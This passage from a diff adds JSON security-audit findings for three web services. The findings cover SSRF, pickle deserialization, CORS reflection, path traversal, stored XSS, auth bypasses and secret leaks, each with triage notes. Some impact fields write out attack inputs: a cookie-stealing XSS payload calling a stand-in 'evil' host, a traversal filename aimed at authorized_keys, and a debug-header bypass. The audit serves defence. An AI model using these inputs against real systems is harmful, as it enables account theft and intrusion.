+      "evidence": "relay.conf:25-31 restricts `location /internal/` to 10.20.0.0/16 and 10.30.4.0/24. The Starlette app exposes no /internal prefix at all: app/main.py:23-30 mounts the operator routes under '/ops' (line 28). /ops/* therefore matches the catch-all `location /` at relay.conf:56-58 and is proxied to the app with no restriction. routes_admin.py:3-4 records the resulting false assumption in its own module docstring: 'the edge only forwards them from the office ranges and the jump hosts, so they do not re-check membership' - and indeed none of the four handlers checks from_office() as a gate (replay() at line 53 only reports it in the response body).",
+      "impact": "Anonymous internet callers reach the whole operator surface: flip feature flags (POST /ops/flags), replay stored webhook deliveries to arbitrary tenants (POST /ops/replay), and issue tenant purges (DELETE /ops/tenants/{tenant_id}).",
+      "recommendation": "Align the two: rename the mount to /internal or change the nginx location to /ops/, AND enforce authorisation in the application (deny unless request.state.user has the operator role) rather than relying on the edge alone.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not defence-in-depth: the single control that was supposed to protect these routes matches a prefix that does not exist."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "routes_admin.py is mounted by the production ASGI app at app/main.py:28."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The allow/deny mitigation is accepted as working - it simply guards a different URL space than the one the app serves."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "nginx/relay.conf:23-31,56-58 and app/main.py:23-30 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress is the unauthenticated HTTP request to /ops/*; the JSON bodies are read at routes_admin.py:39 and 48."
+        }
+      ]
+    },
+    {
+      "title": "Public /ops/status endpoint returns the database URL including its password",
+      "location": {
+        "path": "edge-relay/app/routes_admin.py",
+        "symbol": "status",
+        "line": 26
+      },
+      "class": "Credential disclosure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "app/deps.py:11-15 lists '/ops/status' in PUBLIC_PATHS, and SessionAuthMiddleware short-circuits any matching path with request.state.user = None before the session check (app/middleware.py:43-45). The handler then serialises settings.database_url (routes_admin.py:26) together with template_dir and pid. settings.database_url is RELAY_DATABASE_URL, which docker-compose.yml:21 sets to 'postgresql://relay:${POSTGRES_PASSWORD}@db:5432/relay' - the password is embedded in the string.",
+      "impact": "Anonymous retrieval of the Postgres username, host and password. Combined with the app port being published on the host (docker-compose.yml:27) this is a direct route to the database.",
+      "recommendation": "Remove database_url/template_dir from the payload - a liveness widget needs only status and uptime - and take /ops/status out of PUBLIC_PATHS.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A live production credential returned to anonymous callers, not a hardcoded mock database."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Secret disclosure in the endpoint's own logic."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "deps.py:11-15, middleware.py:43-45, routes_admin.py:21-32 and docker-compose.yml:19-21 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "No taint flow to trace: the sink emits server-side configuration to an unauthenticated reader."
+        }
+      ]
+    },
+    {
+      "title": "CORS origin reflection with credentials on the whole /api/ surface",
+      "location": {
+        "path": "edge-relay/nginx/relay.conf",
+        "symbol": "location /api/",
+        "line": 39
+      },
+      "class": "CORS misconfiguration",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "relay.conf:39-41 emits `Access-Control-Allow-Origin: $http_origin` together with `Access-Control-Allow-Credentials: true` for every response under /api/. $http_origin is the caller's own Origin header, so the allowlist is effectively '*' while credentials are permitted. The app authenticates with the `relay_session` cookie (app/middleware.py:55), which browsers attach to these cross-origin requests.",
+      "impact": "Any attacker-controlled web page can issue credentialed cross-origin requests to /api/* on behalf of a signed-in victim and READ the responses - e.g. GET /api/whoami (routes_public.py:14-20) leaks the session claims, and /api/preview can be driven as an SSRF proxy from the victim's session.",
+      "recommendation": "Reflect the Origin only after matching it against an explicit per-tenant subdomain allowlist (map $http_origin $cors_origin { ... }), and answer preflights explicitly rather than with unconditional add_header.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is an actively permissive header, not an absent one."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No safe standard library is in play; the configuration itself grants the access."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "nginx/relay.conf:33-44 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: the Origin request header consumed as $http_origin at edge-relay/nginx/relay.conf:39."
+        }
+      ]
+    },
+    {
+      "title": "Server-side request forgery in the link preview endpoint",
+      "location": {
+        "path": "edge-relay/app/routes_public.py",
+        "symbol": "link_preview",
+        "line": 33
+      },
+      "class": "SSRF",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "routes_public.py:28-33 takes the `url` query parameter and fetches it with httpx and follow_redirects=True. There is no scheme check, no host allowlist, no DNS/IP-literal rejection and no redirect pinning. Lines 40-46 return the upstream status code, content_type and the extracted <title>, giving the attacker a response oracle.",
+      "impact": "The app container can be used to reach anything routable from inside the compose network or the cloud VPC: the cloud instance metadata service, the Postgres port on `db`, the thumbnailer on thumbs:8100, and - because /ops carries no edge ACL - the app's own operator endpoints via http://127.0.0.1:8000/ops/status, which returns the database password.",
+      "recommendation": "Resolve the hostname first, reject non-public IP ranges (RFC1918, loopback, link-local, CGNAT) and non-http(s) schemes, re-check after every redirect (or disable redirects), and route the fetch through a dedicated egress proxy.",
+      "triage": [
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No mitigation exists here to stretch around; the fetch is entirely unguarded."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The claim is unauthorised internal access, not resource exhaustion."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "routes_public.py:23-47 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.query_params.get(\"url\") at edge-relay/app/routes_public.py:28."
+        }
+      ]
+    },
+    {
+      "title": "Application container publishes port 8000 on the host, bypassing the nginx edge entirely",
+      "location": {
+        "path": "edge-relay/docker-compose.yml",
+        "symbol": "services.app.ports",
+        "line": 27
+      },
+      "class": "Network exposure / control bypass",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "docker-compose.yml:24-27 binds the app's uvicorn port to the host ('8000:8000') with the comment 'Published so the load tester and the on-call debugger can reach the service without going through the edge container.' Every control that lives in nginx - the /internal/ allow/deny list (relay.conf:25-31), limit_req/limit_conn (lines 34-35) and the security headers (lines 19-21) - is skipped on that port. The app also has no own IP restriction: from_office() (app/deps.py:63-65) is advisory only.",
+      "impact": "Direct access to the operator surface, the SSRF-capable preview endpoint and all API routes with no rate limiting; also lets a caller set X-Forwarded-For freely because nginx is not there to append the real peer.",
+      "recommendation": "Remove the host port mapping (use `expose` and reach the container over the compose network or an SSH tunnel), and make the application enforce operator authorisation itself.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a missing header: the deployment deliberately exposes the origin, defeating the only access control in the stack."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the shipped compose file, not a test fixture; the exposure is unconditional."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "docker-compose.yml:16-30 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Configuration exposure, not a data-flow finding."
+        }
+      ]
+    },
+    {
+      "title": "Header-only auth bypass is enabled whenever RELAY_ENV is unset, because the default environment is 'local'",
+      "location": {
+        "path": "edge-relay/app/middleware.py",
+        "symbol": "SessionAuthMiddleware.dispatch",
+        "line": 47
+      },
+      "class": "Authentication bypass (insecure default)",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "middleware.py:47-53 accepts the `x-debug-user` header as a complete substitute for the session cookie and grants role 'operator' whenever settings.is_local. is_local is `self.env == 'local'` (deps.py:41-42) and env defaults to os.environ.get('RELAY_ENV', 'local') (deps.py:26) - the fail-open direction. The current compose file sets RELAY_ENV=production, so the branch is inert in that one deployment, but any run that loses the variable (a bare `uvicorn app.main:app`, a task definition that drops the env, a new manifest) silently re-enables it.",
+      "impact": "Where the variable is absent, sending `x-debug-user: anyone` authenticates as an operator on every non-public path, including /ops/flags, /ops/replay and DELETE /ops/tenants/{id}.",
+      "recommendation": "Invert the default (env defaults to 'production'; only an explicit RELAY_ENV=local enables the shortcut), or delete the branch and use a local fixture cookie instead.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical API misuse: the branch is in the shipped middleware and is selected by configuration state, not by a caller's mistake."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "HOLDS",
+          "reason": "Requires an environmental precondition (RELAY_ENV absent) that the reviewed docker-compose.yml:20 does not satisfy, so strict reproducibility is not met for THIS deployment - reported at low severity as an insecure default rather than an exploitable path."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "middleware.py:47-53 and deps.py:24-42 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.headers['x-debug-user'] at edge-relay/app/middleware.py:51."
+        }
+      ]
+    },
+    {
+      "title": "Session cookie claims are never checked for expiry",
+      "location": {
+        "path": "edge-relay/app/middleware.py",
+        "symbol": "SessionAuthMiddleware.dispatch",
+        "line": 64
+      },
+      "class": "Session management",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "_unsign (middleware.py:17-34) verifies the HMAC and returns the decoded claims; dispatch assigns them to request.state.user at line 64. Nothing anywhere reads an 'exp'/'iat' field or consults a revocation list, and there is no server-side session store. Contrast the sibling services, which do check (atlas-sync token.go:83, ledger-flow models.py:35).",
+      "impact": "A session cookie captured once - from a shared machine, a proxy log, or a backup - authenticates forever. Sign-out and credential rotation cannot invalidate it.",
+      "recommendation": "Include an expiry claim in the signed payload and reject stale cookies in _unsign; add a server-side revocation check (session id -> valid) for sign-out and password change.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Absence of any expiry on a bearer credential is a lifecycle flaw, not a missing hardening header."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The HMAC mitigation is accepted as correct; the gap is that authenticity without freshness does not bound the credential's lifetime."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "middleware.py:17-34,55-65 verified verbatim; grep for 'exp' in edge-relay/app returns no expiry check."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.cookies.get(\"relay_session\") at edge-relay/app/middleware.py:55."
+        }
+      ]
+    },
+    {
+      "title": "Internal-token guard checks the wrong prefix, leaving every maintenance endpoint unauthenticated",
+      "location": {
+        "path": "ledger-flow/auth.py",
+        "symbol": "enforce_internal_token",
+        "line": 55
+      },
+      "class": "Missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "auth.py:13 defines INTERNAL_PREFIX = '/internal', and enforce_internal_token returns immediately unless request.path starts with it (auth.py:55-56). app.py:35 registers internal_bp with url_prefix='/api/internal', so the live paths are '/api/internal/...' and the startswith test is always False - the abort(403) at line 61 is unreachable. internal_bp itself registers no before_request guard (compare blueprints/api.py:16, which does call require_session), so the maintenance blueprint has no authentication of any kind.",
+      "impact": "Unauthenticated internet callers can read the SQLAlchemy database URI and import root (GET /api/internal/status, internal.py:16-21), import arbitrary staged files into any tenant (POST /api/internal/import, internal.py:24-39), force REINDEX TABLE postings, and permanently delete every posting of any tenant (DELETE /api/internal/tenants/<tenant_id>, internal.py:49-53).",
+      "recommendation": "Change INTERNAL_PREFIX to '/api/internal' (or better, derive it from the blueprint registration), add internal_bp.before_request(require_session) plus a role check, and add a test asserting 403 on /api/internal/status without the header.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not defence-in-depth: the shared-header guard is the only control on these routes and it never executes."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "internal.py is registered by the production app factory at app.py:35."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "auth.py:11-13,53-62 and app.py:31-35 verified verbatim; the string '/api/internal' appears only in app.py."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.get_json() at ledger-flow/blueprints/internal.py:27 and the path parameter at internal.py:50, both on unauthenticated routes."
+        }
+      ]
+    },
+    {
+      "title": "Insecure deserialization: pickle.loads on request form data",
+      "location": {
+        "path": "ledger-flow/blueprints/api.py",
+        "symbol": "restore_draft",
+        "line": 79
+      },
+      "class": "Insecure deserialization / RCE",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "api.py:78-79 reads request.form['state'], base64-decodes it and calls pickle.loads on the result. Python's pickle executes __reduce__ during load, so a crafted blob runs arbitrary code. No signature, HMAC or allowlist unpickler guards the input; the docstring (lines 73-77) confirms the blob is client-authored ('The client serialises the in-progress form').",
+      "impact": "Remote code execution in the ledger service worker as the application user, with access to LEDGER_SECRET_KEY, LEDGER_INTERNAL_TOKEN, the database credentials and the import volume. Reachable by any authenticated user (api_bp.before_request(require_session), api.py:16).",
+      "recommendation": "Replace pickle with json for the draft blob and validate its shape; if a binary format is unavoidable, HMAC the payload with the server secret and verify before loading.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The opposite of the safe-library case FP-04 protects: json.loads would be safe, pickle.loads is not, and pickle was chosen."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Route lives in the production API blueprint registered at app.py:33."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Direct injection path in the handler's own logic."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "api.py:1-5,71-80 verified verbatim (pickle imported at line 4)."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.form.get(\"state\") at ledger-flow/blueprints/api.py:78."
+        }
+      ]
+    },
+    {
+      "title": "Reports blueprint has no auth guard and current_tenant() honours a ?tenant= query parameter for anonymous callers",
+      "location": {
+        "path": "ledger-flow/auth.py",
+        "symbol": "current_tenant",
+        "line": 95
+      },
+      "class": "Broken access control / cross-tenant disclosure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "current_tenant returns g.user['tenant_id'] for a signed-in caller but falls back to request.args.get('tenant') when g.user is None (auth.py:92-95); the docstring explains the fallback exists for a cookie-less nightly job. reports_bp registers no before_request(require_session) - app.py:34 mounts it at /reports and blueprints/reports.py has no guard, unlike blueprints/api.py:16. All three views call current_tenant() (reports.py:50, 72, 91) and pass the result straight to _rows_for's filter_by(tenant_id=...).",
+      "impact": "Any anonymous caller who knows or guesses a tenant id reads that tenant's full ledger: GET /reports/export.csv?tenant=<id> dumps up to 100000 postings (entry ids, account codes, amounts, memos), and /reports/statement and /reports/trial-balance expose the same data.",
+      "recommendation": "Add reports_bp.before_request(require_session), drop the query-parameter fallback, and give the nightly job a service credential resolved through load_session like any other caller.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The permissive fallback is in shipped code and is reached by the shipped views, not by a hypothetical caller."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Bulk financial data disclosure, not a hygiene gap."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "auth.py:86-95, app.py:34 and reports.py:48-100 verified verbatim; grep shows no require_session in blueprints/reports.py."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: request.args.get(\"tenant\") at ledger-flow/auth.py:95, flowing to the query filter at reports.py:42."
+        }
+      ]
+    },
+    {
+      "title": "Hardcoded fallback SECRET_KEY signs the session cookie and CSRF tokens",
+      "location": {
+        "path": "ledger-flow/config.py",
+        "symbol": "BaseConfig.SECRET_KEY",
+        "line": 15
+      },
+      "class": "Hardcoded secret",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "config.py:15 sets SECRET_KEY = os.environ.get('LEDGER_SECRET_KEY', 'ledger-flow-default-secret'). The comment on line 14 states it 'Signs the session cookie and the CSRF tokens'. ProductionConfig inherits it unchanged (config.py:38-40) and load() returns ProductionConfig for any unknown LEDGER_CONFIG value (lines 49-52), so a deployment that forgets the variable starts silently with the published constant rather than failing.",
+      "impact": "With the key known, an attacker mints a valid Flask session cookie containing any 'uid'. load_session (auth.py:24-34) trusts session['uid'] directly, so this is authentication as any user - including one whose role is 'accountant', which is what require_role gates DELETE /api/v1/entries/<id> on (api.py:83-84).",
+      "recommendation": "Remove the default and fail fast: raise at start-up when LEDGER_SECRET_KEY is missing in a non-testing configuration.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-02 exempts hardcoded MOCK databases; this is the production signing key for the session cookie."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-08 names hardcoded static secrets as valid outright, and this one is actively used by the production config class."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "config.py:13-15,38-52 and auth.py:20-34 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "FP-08 exempts intrinsic secret-handling flaws from trust-boundary tracing."
+        }
+      ]
+    },
+    {
+      "title": "Stored XSS: the bulk importer bypasses Posting.clean(), and statements render memos as trusted markup",
+      "location": {
+        "path": "ledger-flow/services/importer.py",
+        "symbol": "import_batch",
+        "line": 82
+      },
+      "class": "Stored XSS",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "Posting.clean() is the documented invariant for everything landing in the table (models.py:60-66) and it is what applies bleach.clean with ALLOWED_MEMO_TAGS (models.py:77-79). The API write path honours it (services/postings.py:17). import_batch does not: it assembles plain dicts (importer.py:67-77) and calls db.session.bulk_insert_mappings (line 82), which writes rows without instantiating the model or running clean(), so memo is stored exactly as the CSV supplied it. reports.py:64 then wraps that value in Markup(p.memo or ''), explicitly marking it safe so Jinja does not escape it at reports.py:30.",
+      "impact": "A memo cell such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` in an imported bank file executes in every viewer's browser on GET /reports/statement, in the session of an accountant. The import can be triggered by anyone because /api/internal/import is unauthenticated (see the internal-prefix finding).",
+      "recommendation": "Run the same sanitiser in the importer (build Posting objects and call clean(), or bleach.clean the memo before appending the mapping), and stop wrapping stored data in Markup() - render inline formatting through an explicit allowlist filter at template time.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Both halves are shipped code: the importer that skips the invariant and the template that trusts the value."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The bleach mitigation is accepted as effective where it runs; the finding is that this write path never reaches it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "importer.py:58-84, models.py:60-80 and reports.py:60-67 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: the CSV row value at ledger-flow/services/importer.py:74 (row.get(\"memo\")), whose file is named by request payload 'file' at blueprints/internal.py:28."
+        }
+      ]
+    },
+    {
+      "title": "Job retry merges an unvalidated request body over the stored job payload, bypassing every schema check",
+      "location": {
+        "path": "orchard-jobs/src/api/routes.js",
+        "symbol": "POST /v1/jobs/:id/retry",
+        "line": 57
+      },
+      "class": "Input validation bypass / SSRF",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The submit path validates with schema.validateRenderJob (routes.js:18), which enforces the documentId pattern, the template enum, the width bounds and - critically - the ASSET_HOSTS allowlist for assetBaseUrl (lib/schema.js:74-81). The retry path does not: routes.js:55-59 takes `ctx.request.body` raw as `overrides` and spreads it LAST over previous.data, so every field, validated or not, is attacker-chosen. tenantId, requestedBy, documentId, width and assetBaseUrl are all overwritten. The only guard is that the ORIGINAL job must belong to the caller's tenant (line 51).",
+      "impact": "assetBaseUrl becomes arbitrary, so the worker's fetch(`${baseUrl}/manifest.json`) at processors/render.js:21 is a full SSRF from inside the worker network (cloud metadata, internal services). tenantId becomes arbitrary, so the rendered artifact is written to `${tenantId}/renders/${documentId}.pdf` (render.js:64) under another tenant's prefix. documentId escapes its ^[a-f0-9]{24}$ pattern and reaches both a filesystem path (render.js:54) and the generated HTML (render.js:58).",
+      "recommendation": "Validate the merged payload: build the retry input as `schema.validateRenderJob({...previous.data, ...overrides})` and additionally pin tenantId/requestedBy from ctx.state.user after validation so they can never be overridden.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a hypothetical misuse of the validator - the shipped retry route simply never calls it."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ASSET_HOSTS mitigation is accepted as correct on the submit path; the claim is that a second path reaches the same sink without it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "routes.js:16-31,49-63, lib/schema.js:71-83 and processors/render.js:20-27,50-64 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: ctx.request.body at orchard-jobs/src/api/routes.js:55, flowing through the queue payload to the fetch sink at src/worker/processors/render.js:21."
+        }
+      ]
+    },
+    {
+      "title": "Partner webhook enqueues export jobs without schema validation, giving the worker a path-traversal write",
+      "location": {
+        "path": "orchard-jobs/src/api/webhook.js",
+        "symbol": "POST /hooks/:partner/exports",
+        "line": 47
+      },
+      "class": "Path traversal / arbitrary file write",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The API export route validates with schema.validateExportJob (routes.js:66), which applies checkFilename's ^(\\w+\\.)*\\w+$ pattern and the tenantId pattern ^[a-z0-9-]{3,40}$ (lib/schema.js:35,57-68,85-89). The webhook route does not call the validator at all: webhook.js:47-53 constructs the payload straight from body.tenant_id, body.filename and body.format. The consumer trusts that: processors/export.js:29-30 states 'Job payloads reach this queue already validated at submission time', then builds `path.join(EXPORT_ROOT, tenantId, `${filename}.${format}`)` at line 40 and writes it after mkdir -p of its dirname (lines 41-42).",
+      "impact": "A partner (or anyone who obtains one ORCHARD_PARTNER_* secret) can write attacker-chosen bytes to an arbitrary path on the worker filesystem - e.g. filename '../../../../home/orchard/.ssh/authorized_keys' or a file under /etc/cron.d - escalating a webhook credential to code execution on the worker. tenantId offers the same escape.",
+      "recommendation": "Call schema.validateExportJob on the webhook payload exactly as the API route does, and defensively re-validate in the processor: reject any tenantId/filename containing a path separator and assert the resolved target still lives under EXPORT_ROOT.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The consumer's assumption is documented at export.js:29-30 and is violated by a shipped producer, not by a hypothetical one."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Both webhook.js and the worker processor are production modules (package.json start:api / start:worker)."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "webhook.js:43-57, routes.js:65-73, lib/schema.js:57-89 and processors/export.js:29-42 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: ctx.request.body.filename at orchard-jobs/src/api/webhook.js:49, reaching the write sink at src/worker/processors/export.js:40-42. The signature check at webhook.js:44 authenticates the partner but does not constrain the payload."
+        }
+      ]
+    },
+    {
+      "title": "Rendered tenant documents are uploaded with a public-read ACL and a permanent public URL",
+      "location": {
+        "path": "orchard-jobs/src/worker/processors/render.js",
+        "symbol": "renderProcessor",
+        "line": 68
+      },
+      "class": "Sensitive data exposure",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "render.js:66-71 uploads every rendered PDF with `public: true`, which lib/storage.js:39-40 translates to `ACL: 'public-read'` and `CacheControl: 'public, max-age=31536000'`. The returned artifact is storage.publicUrl(key) (render.js:75), i.e. `${PUBLIC_BASE}/${key}` with no expiry and no signature, and that URL is handed back through GET /v1/jobs/:id (routes.js:42). The comment at render.js:66-67 states the intent - a non-expiring address for e-mail links.",
+      "impact": "Invoices, statements and letters rendered for tenants are anonymously readable by anyone who obtains the URL (e-mail forwarding, referrer leakage, proxy logs, browser history) and by anyone who can enumerate the bucket. The signedUrl mechanism the API offers for artifacts (routes.js:75-81) is defeated for exactly the documents that need it most.",
+      "recommendation": "Upload with `public: false` and serve through a genuine time-limited pre-signed URL (S3 GetObjectCommand + getSignedUrl); if e-mail links must be long-lived, mint a per-recipient capability token and redirect through the API.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An explicit public-read ACL on tenant financial documents is an active exposure, not a missing hardening measure."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "processors/render.js:64-75 and lib/storage.js:32-49 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Exposure of server-authored artifacts; no untrusted-input flow is claimed."
+        }
+      ]
+    },
+    {
+      "title": "Home-grown artifact 'signed URL' uses a length-extendable SHA-256(secret || message) construction and is never verified",
+      "location": {
+        "path": "orchard-jobs/src/lib/storage.js",
+        "symbol": "objectSignature",
+        "line": 53
+      },
+      "class": "Weak cryptographic construction",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "objectSignature (storage.js:51-56) computes crypto.createHash('sha256').update(`${signingSecret()}${key}${expiresAt}`) - a raw hash over secret-prefixed data, not an HMAC. SHA-256 is a Merkle-Damgard construction, so a holder of one (key, expiresAt, sig) triple can compute a valid signature over `key || expiresAt || glue-padding || suffix` without knowing the secret, and the concatenation is itself ambiguous because no separator delimits key from expiresAt. Separately, signedUrl (lines 59-63) appends ?expires=&sig= to a plain S3 object URL: S3 ignores those parameters, and verifySignedUrl (lines 65-71) - the only code that would check them - has no caller anywhere in the repository (grep: exported at line 78, never imported).",
+      "impact": "The 'time-limited link' returned by GET /v1/artifacts/:key (routes.js:75-81) provides no access control at all: whether the object is reachable depends solely on the bucket ACL, and the TTL is decorative. Where any component is later taught to honour the signature, the construction is forgeable by extension.",
+      "recommendation": "Use crypto.createHmac('sha256', secret) over a delimited, canonical message, or drop the scheme entirely in favour of the AWS SDK's getSignedUrl, which the project already depends on.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "FP-04 protects code that uses secure standard hashes correctly; this misuses a secure hash as a MAC, which is the failure mode FP-08 names."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Intrinsic cryptographic flaw in the module's own logic, valid independently of callers."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "storage.js:51-71 verified verbatim; verifySignedUrl confirmed to have no callers."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "FP-08 exempts intrinsic flaws from trust-boundary tracing."
+        }
+      ]
+    },
+    {
+      "title": "Worker failure logs dump the entire job payload, including the caller's callback token",
+      "location": {
+        "path": "orchard-jobs/src/worker/index.js",
+        "symbol": "worker.on('failed')",
+        "line": 36
+      },
+      "class": "Secret leakage in logs",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "index.js:28-41 logs `payload: job.data` on every failure, with the comment 'Keep the whole payload on failures'. job.data for a render job includes callbackToken, copied verbatim from the request body at api/routes.js:26. Render jobs retry three times by default (queue/index.js:13), so a persistently failing job writes the token to the log repeatedly.",
+      "impact": "Bearer tokens that authenticate the platform to tenant callback endpoints are persisted in plain text in the worker's log stream, where they are readable by anyone with log access and by any downstream log shipper.",
+      "recommendation": "Redact before logging: pick an explicit allowlist of payload fields (jobId, tenantId, template, documentId) or configure pino's redact option for callbackToken/callbackUrl.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not a missing hygiene control: a live credential is actively written to a log sink."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "worker/index.js:28-41 and api/routes.js:20-27 verified verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited: body.callbackToken at orchard-jobs/src/api/routes.js:26, reaching the log sink at src/worker/index.js:36."
+        }
+      ]
+    },
+    {
+      "title": "applyDefaults is a recursive merge with no prototype guard (prototype-pollution gadget)",
+      "location": {
